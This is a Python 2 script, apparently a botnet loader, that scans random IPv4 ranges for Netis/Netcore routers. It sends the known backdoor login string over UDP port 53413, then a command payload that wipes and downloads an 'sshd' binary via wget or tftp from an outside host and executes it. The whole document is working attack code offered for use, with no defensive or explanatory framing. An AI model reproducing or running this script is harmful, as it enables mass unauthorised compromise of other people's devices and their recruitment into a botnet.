#!/usr/bin/python
""" 
			NeTiS-ScaNNeR 
			  By; LiGhT
 DONT FORGET TO SET FILE DESCRIPTOR LIMIT(ulimit)
"""
import threading, sys, time, random, socket, re, os

if len(sys.argv) < 3:
	print "\033[32mNetis Scanner v1\n     \033[36mBy; LiGhT\n\033[35mUsage: python "+sys.argv[0]+" <threads> <ips per range(1-150)>\n\033[35mExample: python "+sys.argv[0]+" 100 25\n\033[37m"
	sys.exit()

ranges = ["110","111","112","113","114","115","116","117","118","119","223","1","103","203","202","122"]
loginpayload = "AAAAAAAAnetcore\x00" #DONT CHANGE
commandpayload = "AA\x00\x00AAAA cd /var/; rm -rf sshd; wget http://1.1.1.1/sshd || tftp -r sshd -g 1.1.1.1; chmod 777 sshd; ./sshd; rm -rf sshd\x00" # MIPSEL Binary
threads = int(sys.argv[1])
num = int(sys.argv[2])

def worker():
	try:
		while True:
			try:
				a = random.choice(ranges)
				number = num + 1
				hoho = []
				for k in xrange(number):
					host = ''+a+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
					hoho.append(host)
				for j in hoho:
					ip = j
					print "\033[37mStarting Thread: %s\033[37m"%(ip)
					nn = nnetis(ip)
					nn.start()
			except:
				pass
	except:
		pass

class nnetis(threading.Thread):
        def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
        def run(self):
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			try:
				print "\033[32mSending Payload: %s"%(self.ip)
				s.sendto(loginpayload, (self.ip, 53413))
				time.sleep(1)
				s.sendto(commandpayload, (self.ip, 53413))
				time.sleep(2)
			except Exception:
				pass

for g in xrange(threads):
	t = threading.Thread(target=worker)
	t.start()